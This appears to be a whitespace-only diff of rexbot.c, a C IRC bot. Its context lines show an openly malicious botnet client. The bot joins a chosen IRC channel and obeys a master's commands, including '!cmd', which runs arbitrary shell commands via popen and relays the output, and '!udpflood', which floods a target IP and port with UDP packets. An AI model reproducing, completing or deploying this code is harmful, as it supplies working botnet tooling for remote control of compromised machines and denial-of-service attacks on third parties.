@@ -20,8 +20,8 @@ to run follow this example; "gcc -o rexbot rexbot.c; ./rexBot ip port nick chan 
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
-   
-   
+
+
    thanks i4k,sigsegv to help us...
 */
 #include <stdio.h>
@@ -46,7 +46,7 @@ to run follow this example; "gcc -o rexbot rexbot.c; ./rexBot ip port nick chan 
 #endif
 
 
-struct user 
+struct user
 {
   char * name;
   char * dns;
@@ -64,7 +64,7 @@ struct irc
  char * server;
  char * nick;
  char * chan;
- struct sockaddr_in in; 
+ struct sockaddr_in in;
 };
 
 
@@ -77,20 +77,20 @@ int orion_getHostByName(const char* name, char* buffer)
     struct sockaddr_in * target = NULL;
     int error;
     char *tmp = NULL;
-    
+
     memset(&hints, 0, sizeof(struct addrinfo));
-    
+
     hints.ai_family = PF_UNSPEC;
     hints.ai_socktype = 0;
     error = getaddrinfo(name, "http", &hints, &res0);
-    
+
     if (error)
     {
         if (res0)
             freeaddrinfo(res0);
         return error;
     }
-    
+
     for (res = res0; res; res = res->ai_next)
     {
         target = (struct sockaddr_in *) res->ai_addr;
@@ -107,14 +107,14 @@ int orion_getHostByName(const char* name, char* buffer)
             }
         }
     }
-    
+
     freeaddrinfo(res0);
-    
+
     return 0;
 }
-	
-void 
-initBot (struct irc * bot, char * serv, int port, char * nick, char * chan, char * master) 
+
+void
+initBot (struct irc * bot, char * serv, int port, char * nick, char * chan, char * master)
 {
   char server[BUF];
   orion_getHostByName(serv, server);
@@ -126,7 +126,7 @@ initBot (struct irc * bot, char * serv, int port, char * nick, char * chan, char
 }
 
 // resposta para PING
-void 
+void
 pong (struct irc * bot, char * rcv)
 {
   const char * ping = "PING";
@@ -134,11 +134,11 @@ pong (struct irc * bot, char * rcv)
   for  (i = 0; rcv[i] == ping[i] ; i++) {
     if (ping [i+1] == 0) {
       rcv[1] = 'O';  //s/^PING/PONG/
-      SAY ("%s", rcv); 
+      SAY ("%s", rcv);
       send (bot->socket, rcv, strlen(rcv), 0);//sendStr (bot, rcv);
       return;
     }
-  }     
+  }
 }
 void
 udpFlood (char *server, int port, int times)
@@ -179,7 +179,7 @@ chomp (char * str)
     str++;
   }
 }
- 
+
 char *
 gettoken (char ** t, char delim, char * rcv)
 {
@@ -229,7 +229,7 @@ sendHours (struct irc * bot)
   char msg [BUF];
   time_t agora = time (NULL);
   struct tm * ptr_tm = localtime (&agora);
-  strftime (msg, BUF-1, "%H:%M:%S\n", ptr_tm); 
+  strftime (msg, BUF-1, "%H:%M:%S\n", ptr_tm);
   sendMsgChan (bot, msg);
 }
 void
@@ -244,7 +244,7 @@ exitServ (struct irc * bot)
 {
   sendStr (bot, "QUIT\r\n");
   close (bot->socket);
-  exit (0); 
+  exit (0);
 }
 void
 sendUdpFlood (struct irc * bot, char * arg)
@@ -259,9 +259,9 @@ sendUdpFlood (struct irc * bot, char * arg)
   SAY ("ip: %s :: port: %d :: qtd: %d \n", ip, port_int, tam);
   if (ip == NULL || port_int < 1 || port_int > 65535) {
     sendMsgChan (bot, "!udpflood ip porta tamanho\r\n");
-    return; 
+    return;
   } else
-  if (tam < 1) 
+  if (tam < 1)
     tam = 666;
   udpFlood (ip, port_int, tam);
 
@@ -275,7 +275,7 @@ execCmd (struct irc * bot, char * cmd)
   FILE * fpipe;
   char line [BUF];
   chomp (cmd);
-  if ( !(fpipe = (FILE *)popen (cmd,"r")) ) {  
+  if ( !(fpipe = (FILE *)popen (cmd,"r")) ) {
     sendMsgUser (bot, bot->master, "Problems with pipe");
     return;
   }
@@ -291,16 +291,16 @@ execOrder (struct irc * bot, int num, char * next)
 {
   char * tmp;
   switch (num) {
-    case 0: 
-      sendMsgUser (bot, next, gettoken(&tmp , ' ', next)); 
+    case 0:
+      sendMsgUser (bot, next, gettoken(&tmp , ' ', next));
       break;
-    case 1: 
-      sendMsgChan (bot, next); 
+    case 1:
+      sendMsgChan (bot, next);
       break;
-    case 2: 
+    case 2:
       execCmd (bot, next);
       break;
-    case 3:  
+    case 3:
       sendHours (bot);
       break;
     case 4:
@@ -321,7 +321,7 @@ parserOrder (struct irc * bot, char * rcv)
   int i, len;
   char * cmd, *next;
   char * cmds[7] = { "!say-to", "!say", "!cmd", "!hours", "!enter", "!exit", "!udpflood"}  ;
-  
+
   if (*rcv == '!') { //is a command ?
     next = gettoken (&cmd, ' ', rcv);
     len = (int)(sizeof (cmds)/sizeof (char *));
@@ -366,7 +366,7 @@ parser (struct irc * bot, char * rcv)
     else {
       usuario.master = 0;
     }
-  
+
   }
   else {
     pong (bot, rcv);
@@ -379,26 +379,26 @@ int
 connectBot(struct irc * bot)
 {
   char buff[BUF], recup[BUF];
-		
+
   bot->socket = socket(AF_INET, SOCK_STREAM, 0);
-  bot->in.sin_port = htons(bot->port);	
+  bot->in.sin_port = htons(bot->port);
   bot->in.sin_family = AF_INET;
   bot->in.sin_addr.s_addr = inet_addr(bot->server);
-	
+
   if (connect(bot->socket, (struct sockaddr *)&bot->in, sizeof(bot->in)) == -1) {
     puts ("[-]Error server");
     return -1;
   }
-	
+
   snprintf (buff, BUF-1, "USER kitu ou pas :guest\r\nNICK %s\r\nJOIN #%s\r\n", bot->nick, bot->chan);
   send (bot->socket, buff, strlen(buff), 0);
-	
+
   while(1) {
     memset (recup, 0, sizeof(recup));
     recv (bot->socket, recup, sizeof(recup), 0);
     printf ("%s", recup);
     parser(bot, recup);
-  }	
+  }
   close(bot->socket);
   return 0;
 }
